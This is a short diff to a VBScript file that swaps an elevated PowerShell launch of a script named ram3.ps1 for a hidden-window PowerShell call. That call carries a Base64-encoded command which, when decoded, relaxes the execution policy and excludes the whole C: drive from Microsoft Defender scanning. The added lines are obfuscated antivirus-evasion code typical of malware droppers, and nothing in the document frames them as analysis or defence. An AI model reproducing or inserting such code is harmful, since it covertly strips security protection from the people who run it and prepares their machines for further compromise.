@@ -1,2 +1,2 @@
-Set oShell = CreateObject("Shell.Application")  
-oShell.ShellExecute "powershell", "-executionpolicy bypass -file ram3.ps1", "", "runas", 1  
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run("powershell -sta -NoExit -WindowStyle Hidden -EncodedCommand ""UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAFIAZQBtAG8AdABlAFMAaQBnAG4AZQBkAA0ACgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAAiAA==""")
